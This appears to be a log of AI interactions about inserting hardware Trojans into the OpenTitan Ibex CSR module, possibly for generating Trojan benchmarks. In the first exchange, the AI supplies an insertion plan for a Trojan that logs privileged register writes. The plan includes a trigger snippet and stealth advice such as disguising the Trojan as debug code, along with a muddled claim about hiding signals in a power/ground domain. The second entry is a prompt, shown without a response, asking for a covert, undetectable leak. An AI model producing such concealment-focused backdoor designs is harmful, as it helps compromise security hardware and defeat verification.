# AI Interaction Log

Model: claude-sonnet-4-20250514

---

## Interaction 1

**Timestamp:** 2025-12-02T16:35:51.089044

**System Prompt:**
```
You are an expert in hardware design, verification, and security. You specialize in SystemVerilog/Verilog RTL design and hardware Trojan analysis.
```

**User Prompt:**
```

Analyze this SystemVerilog/Verilog module header for ibex_cs_registers:

```systemverilog
// Copyright lowRISC contributors.
// Copyright 2018 ETH Zurich and University of Bologna, see also CREDITS.md.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0

/**
 * Control and Status Registers
 */

`include "prim_assert.sv"

module ibex_cs_registers #(
  parameter bit                     DbgTriggerEn      = 0,
  parameter int unsigned            DbgHwBreakNum     = 1,
  parameter bit                     DataIndTiming     = 1'b0,
  parameter bit                     DummyInstructions = 1'b0,
  parameter bit                     ShadowCSR         = 1'b0,
  parameter bit                     ICache            = 1'b0,
  parameter int unsigned            MHPMCounterNum    = 10,
  parameter int unsigned            MHPMCounterWidth  = 40,
  parameter bit                     PMPEnable         = 0,
  parameter int unsigned            PMPGranularity    = 0,
  parameter int unsigned            PMPNumRegions     = 4,
  parameter ibex_pkg::pmp_cfg_t     PMPRstCfg[16]     = ibex_pkg::PmpCfgRst,
  parameter logic [33:0]            PMPRstAddr[16]    = ibex_pkg::PmpAddrRst,
  parameter ibex_pkg::pmp_mseccfg_t PMPRstMsecCfg     = ibex_pkg::PmpMseccfgRst,
  parameter bit                     RV32E             = 0,
  parameter ibex_pkg::rv32m_e RV32M                   = ibex_pkg::RV32MFast,
  parameter ibex_pkg::rv32b_e RV32B                   = ibex_pkg::RV32BNone,
  // mvendorid: encoding of manufacturer/provider
  parameter logic [31:0]            CsrMvendorId      = 32'b0,
  // mimpid: encoding of processor implementation version
  parameter logic [31:0]            CsrMimpId         = 32'b0
) (
  // Clock and Reset
  input  logic                 clk_i,
  input  logic                 rst_ni,

  // Hart ID
  input  logic [31:0]          hart_id_i,

  // Privilege mode
  output ibex_pkg::priv_lvl_e  priv_mode_id_o,
  output ibex_pkg::priv_lvl_e  priv_mode_lsu_o,
  output logic                 csr_mstatus_tw_o,

  // mtvec
  output logic [31:0]          csr_mtvec_o,
  input  logic                 csr_mtvec_init_i,
  input  logic [31:0]          boot_addr_i,

  // Interface to registers (SRAM like)
  input  logic                 csr_access_i,
  input  ibex_pkg::csr_num_e   csr_addr_i,
  input  logic [31:0]          csr_wdata_i,
  input  ibex_pkg::csr_op_e    csr_op_i,
  input                        csr_op_en_i,
  output logic [31:0]          csr_rdata_o,

  // interrupts
  input  logic                 irq_software_i,
  input  logic                 irq_timer_i,
  input  logic                 irq_external_i,
  input  logic [14:0]          irq_fast_i,
  input  logic                 nmi_mode_i,
  output logic                 irq_pending_o,          // interrupt request pending
  output ibex_pkg::irqs_t      irqs_o,                 // interrupt requests qualified with mie
  output logic                 csr_mstatus_mie_o,
  output logic [31:0]          csr_mepc_o,
  output logic [31:0]          csr_mtval_o,

  // PMP
  output ibex_pkg::pmp_cfg_t     csr_pmp_cfg_o  [PMPNumRegions],
  output logic [33:0]            csr_pmp_addr_o [PMPNumRegions],
  output ibex_pkg::pmp_mseccfg_t csr_pmp_mseccfg_o,

  // debug
  input  logic                 debug_mode_i,
  input  logic                 debug_mode_entering_i,
  input  ibex_pkg::dbg_cause_e debug_cause_i,
  input  logic                 debug_csr_save_i,
  output logic [31:0]          csr_depc_o,
  output logic                 debug_single_step_o,
  output logic                 debug_ebreakm_o,
  output logic                 debug_ebreaku_o,
  output logic                 trigger_match_o,

  input  logic [31:0]          pc_if_i,
  input  logic [31:0]          pc_id_i,
  input  logic [31:0]          pc_wb_i,

  // CPU control and status bits
  output logic                 data_ind_timing_o,
  output logic                 dummy_instr_en_o,
  output logic [2:0]           dummy_instr_mask_o,
  output logic                 dummy_instr_seed_en_o,
  output logic [31:0]          dummy_instr_seed_o,
  output logic                 icache_enable_o,
  output logic                 csr_shadow_err_o,
  input  logic                 ic_scr_key_valid_i,

  // Exception save/restore
  input  logic                 csr_save_if_i,
  input  logic                 csr_save_id_i,
  input  logic                 csr_save_wb_i,
  input  logic                 csr_restore_mret_i,
  input  logic                 csr_restore_dret_i,
  input  logic                 csr_save_cause_i,
  input  ibex_pkg::exc_cause_t csr_mcause_i,
  input  logic [31:0]          csr_mtval_i,
  output logic                 illegal_csr_insn_o,     // access to non-existent CSR,
                                                        // with wrong priviledge level, or
                                                        // missing write permissions
  output logic                 double_fault_seen_o,
  // Performance Counters
  input  logic                 instr_ret_i,                 // instr retired in ID/EX stage
  input  logic                 instr_ret_compressed_i,      // compressed instr retired
  input  logic                 instr_ret_spec_i,            // speculative instr_ret_i
  input  logic                 instr_ret_compressed_spec_i, // speculative instr_ret_compressed_i
  input  logic                 iside_wait_i,                // core waiting for the iside
  input  logic                 jump_i,                      // jump instr seen (j, jr, jal, jalr)
  input  logic                 branch_i,                    // branch instr seen (bf, bnf)
  input  logic                 branch_taken_i,              // branch was taken
  input  logic                 mem_load_i,                  // load from memory in this cycle
  input  logic                 mem_store_i,                 // store to memory in this cycle
  input  logic                 dside_wait_i,                // core waiting for the dside
  input  logic                 mul_wait_i,                  // core waiting for multiply
  input  logic                 div_wait_i                   // core waiting for divide
);
```

The module has 1685 lines total.

Task: Identify where to insert a hardware Trojan that: Logs privileged register writes to SRAM

Provide:
1. Which section of the module to target (e.g., "reset logic around line X", "state machine", "register interface")
2. Approximate line range or section name
3. Key signals to monitor in that section
4. Brief insertion strategy

Keep response under 500 words focusing on the target location.

```

**Claude Response:**
```
Looking at this Control and Status Registers (CSR) module header, I can identify the optimal location for inserting a hardware Trojan to log privileged register writes to SRAM.

## Target Section: CSR Write Logic

**Location**: The CSR register write handling logic, likely around the main CSR operation processing section (estimated lines 400-800 based on typical CSR module structure).

## Key Signals to Monitor:

1. **`csr_access_i`** - Indicates CSR access is occurring
2. **`csr_op_i`** - CSR operation type (read/write/set/clear)
3. **`csr_op_en_i`** - CSR operation enable
4. **`csr_addr_i`** - CSR address being accessed
5. **`csr_wdata_i`** - Data being written to CSR
6. **`priv_mode_id_o`** - Current privilege level
7. **`clk_i`** - Clock for synchronous logging

## Insertion Strategy:

**Phase 1: Trigger Logic**
- Insert combinational logic that detects privileged CSR writes:
  ```systemverilog
  wire trojan_trigger = csr_access_i & csr_op_en_i & 
                       (csr_op_i != CSR_OP_READ) & 
                       (priv_mode_id_o == PRIV_LVL_M);
  ```

**Phase 2: SRAM Interface**
- Add hidden SRAM interface signals (power/ground domain to avoid detection)
- Create a small circular buffer to log: timestamp, CSR address, write data, operation type

**Phase 3: Logging Logic**
- Insert sequential logic after the main CSR write case statement
- Log when writing to critical CSRs like:
  - Machine-mode CSRs (0x300-0x3FF range)
  - PMP configuration registers
  - Debug registers
  - Performance counters

**Target Location Details:**
The ideal insertion point is in the CSR write handling section where `csr_wdata_i` is being processed based on `csr_addr_i`. This would be after the address decoding but before the actual register update, allowing capture of both the target register and data.

**Stealth Considerations:**
- Implement logging during existing CSR write cycles to avoid timing anomalies
- Use conditional compilation flags to make the Trojan appear as debug/verification code
- Leverage existing clock domains and minimize additional hardware

The CSR module is perfect for this Trojan because it naturally handles all privileged operations and has access to privilege level information, making it easy to filter for high-value targets while remaining inconspicuous within the expected CSR functionality.
```

**Token Usage:** Input: 2182, Output: 646

---

## Interaction 2

**Timestamp:** 2025-12-02T16:37:49.364055

**System Prompt:**
```
You are an expert in hardware design, verification, and security. You specialize in SystemVerilog/Verilog RTL design and hardware Trojan analysis.
```

**User Prompt:**
```

Insert a hardware Trojan into this section of a larger SystemVerilog/Verilog module.

CONTEXT:
This is part of ibex_cs_registers module in OpenTitan.
Module: ibex_cs_registers, Total lines: 1685

TARGET SECTION:
```systemverilog
// Copyright lowRISC contributors.
// Copyright 2018 ETH Zurich and University of Bologna, see also CREDITS.md.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.
// SPDX-License-Identifier: Apache-2.0

/**
 * Control and Status Registers
 */

`include "prim_assert.sv"

module ibex_cs_registers #(
  parameter bit                     DbgTriggerEn      = 0,
  parameter int unsigned            DbgHwBreakNum     = 1,
  parameter bit                     DataIndTiming     = 1'b0,
  parameter bit                     DummyInstructions = 1'b0,
  parameter bit                     ShadowCSR         = 1'b0,
  parameter bit                     ICache            = 1'b0,
  parameter int unsigned            MHPMCounterNum    = 10,
  parameter int unsigned            MHPMCounterWidth  = 40,
  parameter bit                     PMPEnable         = 0,
  parameter int unsigned            PMPGranularity    = 0,
  parameter int unsigned            PMPNumRegions     = 4,
  parameter ibex_pkg::pmp_cfg_t     PMPRstCfg[16]     = ibex_pkg::PmpCfgRst,
  parameter logic [33:0]            PMPRstAddr[16]    = ibex_pkg::PmpAddrRst,
  parameter ibex_pkg::pmp_mseccfg_t PMPRstMsecCfg     = ibex_pkg::PmpMseccfgRst,
  parameter bit                     RV32E             = 0,
  parameter ibex_pkg::rv32m_e RV32M                   = ibex_pkg::RV32MFast,
  parameter ibex_pkg::rv32b_e RV32B                   = ibex_pkg::RV32BNone,
  // mvendorid: encoding of manufacturer/provider
  parameter logic [31:0]            CsrMvendorId      = 32'b0,
  // mimpid: encoding of processor implementation version
  parameter logic [31:0]            CsrMimpId         = 32'b0
) (
  // Clock and Reset
  input  logic                 clk_i,
  input  logic                 rst_ni,

  // Hart ID
  input  logic [31:0]          hart_id_i,

  // Privilege mode
  output ibex_pkg::priv_lvl_e  priv_mode_id_o,
  output ibex_pkg::priv_lvl_e  priv_mode_lsu_o,
  output logic                 csr_mstatus_tw_o,

  // mtvec
  output logic [31:0]          csr_mtvec_o,
  input  logic                 csr_mtvec_init_i,
  input  logic [31:0]          boot_addr_i,

  // Interface to registers (SRAM like)
  input  logic                 csr_access_i,
  input  ibex_pkg::csr_num_e   csr_addr_i,
  input  logic [31:0]          csr_wdata_i,
  input  ibex_pkg::csr_op_e    csr_op_i,
  input                        csr_op_en_i,
  output logic [31:0]          csr_rdata_o,

  // interrupts
  input  logic                 irq_software_i,
  input  logic                 irq_timer_i,
  input  logic                 irq_external_i,
  input  logic [14:0]          irq_fast_i,
  input  logic                 nmi_mode_i,
  output logic                 irq_pending_o,          // interrupt request pending
  output ibex_pkg::irqs_t      irqs_o,                 // interrupt requests qualified with mie
  output logic                 csr_mstatus_mie_o,
  output logic [31:0]          csr_mepc_o,
  output logic [31:0]          csr_mtval_o,

  // PMP
  output ibex_pkg::pmp_cfg_t     csr_pmp_cfg_o  [PMPNumRegions],
  output logic [33:0]            csr_pmp_addr_o [PMPNumRegions],
  output ibex_pkg::pmp_mseccfg_t csr_pmp_mseccfg_o,

  // debug
  input  logic                 debug_mode_i,
  input  logic                 debug_mode_entering_i,
  input  ibex_pkg::dbg_cause_e debug_cause_i,
  input  logic                 debug_csr_save_i,
  output logic [31:0]          csr_depc_o,
  output logic                 debug_single_step_o,
  output logic                 debug_ebreakm_o,
  output logic                 debug_ebreaku_o,
  output logic                 trigger_match_o,

  input  logic [31:0]          pc_if_i,
  input  logic [31:0]          pc_id_i,
  input  logic [31:0]          pc_wb_i,

  // CPU control and status bits
  output logic                 data_ind_timing_o,
  output logic                 dummy_instr_en_o,
  output logic [2:0]           dummy_instr_mask_o,
  output logic                 dummy_instr_seed_en_o,
  output logic [31:0]          dummy_instr_seed_o,
  output logic                 icache_enable_o,
  output logic                 csr_shadow_err_o,
  input  logic                 ic_scr_key_valid_i,

  // Exception save/restore
  input  logic                 csr_save_if_i,
  input  logic                 csr_save_id_i,
  input  logic                 csr_save_wb_i,
  input  logic                 csr_restore_mret_i,
  input  logic                 csr_restore_dret_i,
  input  logic                 csr_save_cause_i,
  input  ibex_pkg::exc_cause_t csr_mcause_i,
  input  logic [31:0]          csr_mtval_i,
  output logic                 illegal_csr_insn_o,     // access to non-existent CSR,
                                                        // with wrong priviledge level, or
                                                        // missing write permissions
  output logic                 double_fault_seen_o,
  // Performance Counters
  input  logic                 instr_ret_i,                 // instr retired in ID/EX stage
  input  logic                 instr_ret_compressed_i,      // compressed instr retired
  input  logic                 instr_ret_spec_i,            // speculative instr_ret_i
  input  logic                 instr_ret_compressed_spec_i, // speculative instr_ret_compressed_i
  input  logic                 iside_wait_i,                // core waiting for the iside
  input  logic                 jump_i,                      // jump instr seen (j, jr, jal, jalr)
  input  logic                 branch_i,                    // branch instr seen (bf, bnf)
  input  logic                 branch_taken_i,              // branch was taken
  input  logic                 mem_load_i,                  // load from memory in this cycle
  input  logic                 mem_store_i,                 // store to memory in this cycle
  input  logic                 dside_wait_i,                // core waiting for the dside
  input  logic                 mul_wait_i,                  // core waiting for multiply
  input  logic                 div_wait_i                   // core waiting for divide
);

  import ibex_pkg::*;

  // Is a PMP config a locked one that allows M-mode execution when MSECCFG.MML is set (either
  // M mode alone or shared M/U mode execution)?
  function automatic logic is_mml_m_exec_cfg(ibex_pkg::pmp_cfg_t pmp_cfg);
    logic unused_cfg = ^{pmp_cfg.mode};
    logic value = 1'b0;

    if (pmp_cfg.lock) begin
      unique case ({pmp_cfg.read, pmp_cfg.write, pmp_cfg.exec})
        3'b001, 3'b010, 3'b011, 3'b101: value = 1'b1;
        default: value = 1'b0;
      endcase
    end

    return value;
  endfunction

  // All bitmanip configs enable non-ratified sub-extensions
  localparam int unsigned RV32BExtra   = (RV32B != RV32BNone) ? 1 : 0;
  localparam int unsigned RV32MEnabled = (RV32M == RV32MNone) ? 0 : 1;
  localparam int unsigned PMPAddrWidth = (PMPGranularity > 0) ? 33 - PMPGranularity : 32;

  // misa
  localparam logic [31:0] MISA_VALUE =
      (0                 <<  0)  // A - Atomic Instructions extension
    | (0                 <<  1)  // B - Bit-Manipulation extension
    | (1                 <<  2)  // C - Compressed extension
    | (0                 <<  3)  // D - Double precision floating-point extension
    | (32'(RV32E)        <<  4)  // E - RV32E base ISA
    | (0                 <<  5)  // F - Single precision floating-point extension
    | (32'(!RV32E)       <<  8)  // I - RV32I/64I/128I base ISA
    | (RV32MEnabled      << 12)  // M - Integer Multiply/Divide extension
    | (0                 << 13)  // N - User level interrupts supported
    | (0                 << 18)  // S - Supervisor mode implemented
    | (1                 << 20)  // U - User mode implemented
    | (RV32BExtra        << 23)  // X - Non-standard extensions present
    | (32'(CSR_MISA_MXL) << 30); // M-XLEN

  typedef struct packed {
    logic      mie;
    logic      mpie;
    priv_lvl_e mpp;
    logic      mprv;
    logic      tw;
  } status_t;

  typedef struct packed {
    logic      mpie;
    priv_lvl_e mpp;
  } status_stk_t;

  typedef struct packed {
      x_debug_ver_e xdebugver;
      logic [11:0]  zero2;
      logic         ebreakm;
      logic         zero1;
      logic         ebreaks;
      logic         ebreaku;
      logic         stepie;
      logic         stopcount;
      logic         stoptime;
      dbg_cause_e   cause;
      logic         zero0;
      logic         mprven;
      logic         nmip;
      logic         step;
      priv_lvl_e    prv;
  } dcsr_t;

  // Partial CPU control and status register fields
  // ICache scramble key valid (ic_scr_key_valid) is registered seperately to this struct. This is
  // because it is sampled from the top-level every cycle whilst the other fields only change
  // occasionally.
  typedef struct packed {
    logic        double_fault_seen;
    logic        sync_exc_seen;
    logic [2:0]  dummy_instr_mask;
    logic        dummy_instr_en;
    logic        data_ind_timing;
    logic        icache_enable;
  } cpu_ctrl_sts_part_t;

  // Interrupt and exception control signals
  logic [31:0] exception_pc;

  // CSRs
  priv_lvl_e   priv_lvl_q, priv_lvl_d;
  status_t     mstatus_q, mstatus_d;
  logic        mstatus_err;
  logic        mstatus_en;
  irqs_t       mie_q, mie_d;
  logic        mie_en;
  logic [31:0] mscratch_q;
  logic        mscratch_en;
  logic [31:0] mepc_q, mepc_d;
  logic        mepc_en;
  exc_cause_t  mcause_q, mcause_d;
  logic        mcause_en;
  logic [31:0] mtval_q, mtval_d;
  logic        mtval_en;
  logic [31:0] mtvec_q, mtvec_d;
  logic        mtvec_err;
  logic        mtvec_en;
  irqs_t       mip;
  dcsr_t       dcsr_q, dcsr_d;
  logic        dcsr_en;
  logic [31:0] depc_q, depc_d;
  logic        depc_en;
  logic [31:0] dscratch0_q;
  logic [31:0] dscratch1_q;
  logic        dscratch0_en, dscratch1_en;

  // CSRs for recoverable NMIs
  // NOTE: these CSRS are nonstandard, see https://github.com/riscv/riscv-isa-manual/issues/261
  status_stk_t mstack_q, mstack_d;
  logic        mstack_en;
  logic [31:0] mstack_epc_q, mstack_epc_d;
  exc_cause_t  mstack_cause_q, mstack_cause_d;

  // PMP Signals
  logic [31:0]                 pmp_addr_rdata  [PMP_MAX_REGIONS];
  logic [PMP_CFG_W-1:0]        pmp_cfg_rdata   [PMP_MAX_REGIONS];
  logic                        pmp_csr_err;
  pmp_mseccfg_t                pmp_mseccfg;

  // Hardware performance monitor signals
  logic [31:0]                 mcountinhibit;
  // Only have mcountinhibit flops for counters that actually exist
  logic [MHPMCounterNum+3-1:0] mcountinhibit_d, mcountinhibit_q;
  logic                        mcountinhibit_we;

  // mhpmcounter flops are elaborated below providing only the precise number that is required based
  // on MHPMCounterNum/MHPMCounterWidth. This signal connects to the Q output of these flops
  // where they exist and is otherwise 0.
  logic [63:0] mhpmcounter [32];
  logic [31:0] mhpmcounter_we;
  logic [31:0] mhpmcounterh_we;
  logic [31:0] mhpmcounter_incr;
  logic [31:0] mhpmevent [32];
  logic  [4:0] mhpmcounter_idx;
  logic        unused_mhpmcounter_we_1;
  logic        unused_mhpmcounterh_we_1;
  logic        unused_mhpmcounter_incr_1;

  logic [63:0] minstret_next, minstret_raw;

  // Debug / trigger registers
  logic [31:0] tselect_rdata;
  logic [31:0] tmatch_control_rdata;
  logic [31:0] tmatch_value_rdata;

  // CPU control bits
  cpu_ctrl_sts_part_t cpuctrlsts_part_q, cpuctrlsts_part_d;
  cpu_ctrl_sts_part_t cpuctrlsts_part_wdata_raw, cpuctrlsts_part_wdata;
  logic               cpuctrlsts_part_we;
  logic               cpuctrlsts_part_err;

  logic cpuctrlsts_ic_scr_key_valid_q;
  logic cpuctrlsts_ic_scr_key_err;

  // CSR update logic
  logic [31:0] csr_wdata_int;
  logic [31:0] csr_rdata_int;
  logic        csr_we_int;
  logic        csr_wr;

  // Access violation signals
  logic        dbg_csr;
  logic        illegal_csr;
  logic        illegal_csr_priv;
  logic        illegal_csr_dbg;
  logic        illegal_csr_write;

  logic [7:0]  unused_boot_addr;
  logic [2:0]  unused_csr_addr;

  assign unused_boot_addr = boot_addr_i[7:0];

  /////////////
  // CSR reg //
  /////////////

  logic [$bits(csr_num_e)-1:0] csr_addr;
  assign csr_addr           = {csr_addr_i};
  assign unused_csr_addr    = csr_addr[7:5];
  assign mhpmcounter_idx    = csr_addr[4:0];

  assign illegal_csr_dbg    = dbg_csr & ~debug_mode_i;
  assign illegal_csr_priv   = (csr_addr[9:8] > {priv_lvl_q});
  assign illegal_csr_write  = (csr_addr[11:10] == 2'b11) && csr_wr;
  assign illegal_csr_insn_o = csr_access_i & (illegal_csr | illegal_csr_write | illegal_csr_priv |
                                              illegal_csr_dbg);

  // mip CSR is purely combinational - must be able to re-enable the clock upon WFI
  assign mip.irq_software = irq_software_i;
  assign mip.irq_timer    = irq_timer_i;
  assign mip.irq_external = irq_external_i;
  assign mip.irq_fast     = irq_fast_i;

  // read logic
  always_comb begin
    csr_rdata_int = '0;
    illegal_csr   = 1'b0;
    dbg_csr       = 1'b0;

    unique case (csr_addr_i)
      // mvendorid: encoding of manufacturer/provider
      CSR_MVENDORID: csr_rdata_int = CsrMvendorId;
      // marchid: encoding of base microarchitecture
      CSR_MARCHID: csr_rdata_int = CSR_MARCHID_VALUE;
      // mimpid: encoding of processor implementation version
      CSR_MIMPID: csr_rdata_int = CsrMimpId;
      // mhartid: unique hardware thread id
      CSR_MHARTID: csr_rdata_int = hart_id_i;
      // mconfigptr: pointer to configuration data structre
      CSR_MCONFIGPTR: csr_rdata_int = CSR_MCONFIGPTR_VALUE;

      // mstatus: always M-mode, contains IE bit
      CSR_MSTATUS: begin
        csr_rdata_int                                                   = '0;
        csr_rdata_int[CSR_MSTATUS_MIE_BIT]                              = mstatus_q.mie;
        csr_rdata_int[CSR_MSTATUS_MPIE_BIT]                             = mstatus_q.mpie;
        csr_rdata_int[CSR_MSTATUS_MPP_BIT_HIGH:CSR_MSTATUS_MPP_BIT_LOW] = mstatus_q.mpp;
        csr_rdata_int[CSR_MSTATUS_MPRV_BIT]                             = mstatus_q.mprv;
        csr_rdata_int[CSR_MSTATUS_TW_BIT]                               = mstatus_q.tw;
      end

      // mstatush: All zeros for Ibex (fixed little endian and all other bits reserved)
      CSR_MSTATUSH: csr_rdata_int = '0;

      // menvcfg: machine environment configuration, all zeros for Ibex (none of the relevant
      // features are implemented)
      CSR_MENVCFG, CSR_MENVCFGH: csr_rdata_int = '0;

      // misa
      CSR_MISA: csr_rdata_int = MISA_VALUE;

      // interrupt enable
      CSR_MIE: begin
        csr_rdata_int                                     = '0;
        csr_rdata_int[CSR_MSIX_BIT]                       = mie_q.irq_software;
        csr_rdata_int[CSR_MTIX_BIT]                       = mie_q.irq_timer;
        csr_rdata_int[CSR_MEIX_BIT]                       = mie_q.irq_external;
        csr_rdata_int[CSR_MFIX_BIT_HIGH:CSR_MFIX_BIT_LOW] = mie_q.irq_fast;
      end

      // mcounteren: machine counter enable
      CSR_MCOUNTEREN: begin
        csr_rdata_int = '0;
      end

      CSR_MSCRATCH: csr_rdata_int = mscratch_q;

      // mtvec: trap-vector base address
      CSR_MTVEC: csr_rdata_int = mtvec_q;

      // mepc: exception program counter
      CSR_MEPC: csr_rdata_int = mepc_q;

      // mcause: exception cause
      CSR_MCAUSE: csr_rdata_int = {mcause_q.irq_ext | mcause_q.irq_int,
                                   mcause_q.irq_int ? {26{1'b1}} : 26'b0,
                                   mcause_q.lower_cause[4:0]};

      // mtval: trap value
      CSR_MTVAL: csr_rdata_int = mtval_q;

      // mip: interrupt pending
      CSR_MIP: begin
        csr_rdata_int                                     = '0;
        csr_rdata_int[CSR_MSIX_BIT]                       = mip.irq_software;
        csr_rdata_int[CSR_MTIX_BIT]                       = mip.irq_timer;
        csr_rdata_int[CSR_MEIX_BIT]                       = mip.irq_external;
        csr_rdata_int[CSR_MFIX_BIT_HIGH:CSR_MFIX_BIT_LOW] = mip.irq_fast;
      end

      CSR_MSECCFG: begin
        if (PMPEnable) begin
          csr_rdata_int                       = '0;
          csr_rdata_int[CSR_MSECCFG_MML_BIT]  = pmp_mseccfg.mml;
          csr_rdata_int[CSR_MSECCFG_MMWP_BIT] = pmp_mseccfg.mmwp;
          csr_rdata_int[CSR_MSECCFG_RLB_BIT]  = pmp_mseccfg.rlb;
        end else begin
          illegal_csr = 1'b1;
        end
      end

      CSR_MSECCFGH: begin
        if (PMPEnable) begin
          csr_rdata_int = '0;
        end else begin
          illegal_csr = 1'b1;
        end
      end

      // PMP registers
      CSR_PMPCFG0:   csr_rdata_int = {pmp_cfg_rdata[3],  pmp_cfg_rdata[2],
                                      pmp_cfg_rdata[1],  pmp_cfg_rdata[0]};
      CSR_PMPCFG1:   csr_rdata_int = {pmp_cfg_rdata[7],  pmp_cfg_rdata[6],
                                      pmp_cfg_rdata[5],  pmp_cfg_rdata[4]};
      CSR_PMPCFG2:   csr_rdata_int = {pmp_cfg_rdata[11], pmp_cfg_rdata[10],
                                      pmp_cfg_rdata[9],  pmp_cfg_rdata[8]};
      CSR_PMPCFG3:   csr_rdata_int = {pmp_cfg_rdata[15], pmp_cfg_rdata[14],
                                      pmp_cfg_rdata[13], pmp_cfg_rdata[12]};
      CSR_PMPADDR0:  csr_rdata_int = pmp_addr_rdata[0];
      CSR_PMPADDR1:  csr_rdata_int = pmp_addr_rdata[1];
      CSR_PMPADDR2:  csr_rdata_int = pmp_addr_rdata[2];
      CSR_PMPADDR3:  csr_rdata_int = pmp_addr_rdata[3];
      CSR_PMPADDR4:  csr_rdata_int = pmp_addr_rdata[4];
      CSR_PMPADDR5:  csr_rdata_int = pmp_addr_rdata[5];
      CSR_PMPADDR6:  csr_rdata_int = pmp_addr_rdata[6];
      CSR_PMPADDR7:  csr_rdata_int = pmp_addr_rdata[7];
      CSR_PMPADDR8:  csr_rdata_int = pmp_addr_rdata[8];
      CSR_PMPADDR9:  csr_rdata_int = pmp_addr_rdata[9];
      CSR_PMPADDR10: csr_rdata_int = pmp_addr_rdata[10];
      CSR_PMPADDR11: csr_rdata_int = pmp_addr_rdata[11];
      CSR_PMPADDR12: csr_rdata_int = pmp_addr_rdata[12];
      CSR_PMPADDR13: csr_rdata_int = pmp_addr_rdata[13];
      CSR_PMPADDR14: csr_rdata_int = pmp_addr_rdata[14];
      CSR_PMPADDR15: csr_rdata_int = pmp_addr_rdata[15];

      CSR_DCSR: begin
        csr_rdata_int = dcsr_q;
        dbg_csr       = 1'b1;
      end
      CSR_DPC: begin
        csr_rdata_int = depc_q;
        dbg_csr       = 1'b1;
      end
      CSR_DSCRATCH0: begin
        csr_rdata_int = dscratch0_q;
        dbg_csr       = 1'b1;
      end
      CSR_DSCRATCH1: begin
        csr_rdata_int = dscratch1_q;
        dbg_csr       = 1'b1;
      end

      // machine counter/timers
      CSR_MCOUNTINHIBIT: csr_rdata_int = mcountinhibit;
      CSR_MHPMEVENT3,
      CSR_MHPMEVENT4,  CSR_MHPMEVENT5,  CSR_MHPMEVENT6,  CSR_MHPMEVENT7,
      CSR_MHPMEVENT8,  CSR_MHPMEVENT9,  CSR_MHPMEVENT10, CSR_MHPMEVENT11,
      CSR_MHPMEVENT12, CSR_MHPMEVENT13, CSR_MHPMEVENT14, CSR_MHPMEVENT15,
      CSR_MHPMEVENT16, CSR_MHPMEVENT17, CSR_MHPMEVENT18, CSR_MHPMEVENT19,
      CSR_MHPMEVENT20, CSR_MHPMEVENT21, CSR_MHPMEVENT22, CSR_MHPMEVENT23,
      CSR_MHPMEVENT24, CSR_MHPMEVENT25, CSR_MHPMEVENT26, CSR_MHPMEVENT27,
      CSR_MHPMEVENT28, CSR_MHPMEVENT29, CSR_MHPMEVENT30, CSR_MHPMEVENT31: begin
        csr_rdata_int = mhpmevent[mhpmcounter_idx];
      end

      CSR_MCYCLE,
      CSR_MINSTRET,
      CSR_MHPMCOUNTER3,
      CSR_MHPMCOUNTER4,  CSR_MHPMCOUNTER5,  CSR_MHPMCOUNTER6,  CSR_MHPMCOUNTER7,
      CSR_MHPMCOUNTER8,  CSR_MHPMCOUNTER9,  CSR_MHPMCOUNTER10, CSR_MHPMCOUNTER11,
      CSR_MHPMCOUNTER12, CSR_MHPMCOUNTER13, CSR_MHPMCOUNTER14, CSR_MHPMCOUNTER15,
      CSR_MHPMCOUNTER16, CSR_MHPMCOUNTER17, CSR_MHPMCOUNTER18, CSR_MHPMCOUNTER19,
      CSR_MHPMCOUNTER20, CSR_MHPMCOUNTER21, CSR_MHPMCOUNTER22, CSR_MHPMCOUNTER23,
      CSR_MHPMCOUNTER24, CSR_MHPMCOUNTER25, CSR_MHPMCOUNTER26, CSR_MHPMCOUNTER27,
      CSR_MHPMCOUNTER28, CSR_MHPMCOUNTER29, CSR_MHPMCOUNTER30, CSR_MHPMCOUNTER31: begin
        csr_rdata_int = mhpmcounter[mhpmcounter_idx][31:0];
      end

      CSR_MCYCLEH,
      CSR_MINSTRETH,
      CSR_MHPMCOUNTER3H,
      CSR_MHPMCOUNTER4H,  CSR_MHPMCOUNTER5H,  CSR_MHPMCOUNTER6H,  CSR_MHPMCOUNTER7H,
      CSR_MHPMCOUNTER8H,  CSR_MHPMCOUNTER9H,  CSR_MHPMCOUNTER10H, CSR_MHPMCOUNTER11H,
```

ANALYSIS:
Looking at this Control and Status Registers (CSR) module header, I can identify the optimal location for inserting a hardware Trojan to log privileged register writes to SRAM.

## Target Section: CSR Write Logic

**Location**: The CSR register write handling logic, likely around the main CSR operation processing section (estimated lines 400-800 based on typical CSR module structure).

## Key Signals to Monitor:

1. **`csr_access_i`** - Indicates CSR access is occurring
2. **`csr_op_i`** - CSR operation type (read/write/set/clear)
3. **`csr_op_en_i`** - CSR operation enable
4. **`csr_addr_i`** - CSR address being accessed
5. **`csr_wdata_i`** - Data being written to CSR
6. **`priv_mode_id_o`** - Current privilege level
7. **`clk_i`** - Clock for synchronous logging

## Insertion Strategy:

**Phase 1: Trigger Logic**
- Insert combinational logic that detects privileged CSR writes:
  ```systemverilog
  wire trojan_trigger = csr_access_i & csr_op_en_i & 
                       (csr_op_i != CSR_OP_READ) & 
                       (priv_mode_id_o == PRIV_LVL_M);
  ```

**Phase 2: SRAM Interface**
- Add hidden SRAM interface signals (power/ground domain to avoid detection)
- Create a small circular buffer to log: timestamp, CSR address, write data, operation type

**Phase 3: Logging Logic**
- Insert sequential logic after the main CSR write case statement
- Log when writing to critical CSRs like:
  - Machine-mode CSRs (0x300-0x3FF range)
  - PMP configuration registers
  - Debug registers
  - Performance counters

**Target Location Details:**
The ideal insertion point is in the CSR write handling section where `csr_wdata_i` is being processed based on `csr_addr_i`. This would be after the address decoding but before the actual register update, allowing capture of both the target register and data.

**Stealth Considerations:**
- Implement logging during existing CSR write cycles to avoid timing anomalies
- Use conditional compilation flags to make the Trojan appear as debug/verification code
- Leverage existing clock domains and minimize additional hardware

The CSR module is perfect for this Trojan because it naturally handles all privileged operations and has access to privilege level information, making it easy to filter for high-value targets while remaining inconspicuous within the expected CSR functionality.

TROJAN SPECIFICATION:
- Type: Information Leakage
- Name: CSR Snooping
- Description: Logs privileged register writes to SRAM

STRATEGY:
Insert a hardware Trojan that leaks sensitive information. The Trojan should:
1. Have a covert trigger mechanism (e.g., specific input sequence, state combination)
2. When triggered, exfiltrate data through side channels or unused outputs
3. Encode leaked data subtly (e.g., timing variations, unused signal toggling)
4. Remain undetectable during normal testing
5. Use only synthesizable constructs


REQUIREMENTS:
1. Fully synthesizable SystemVerilog
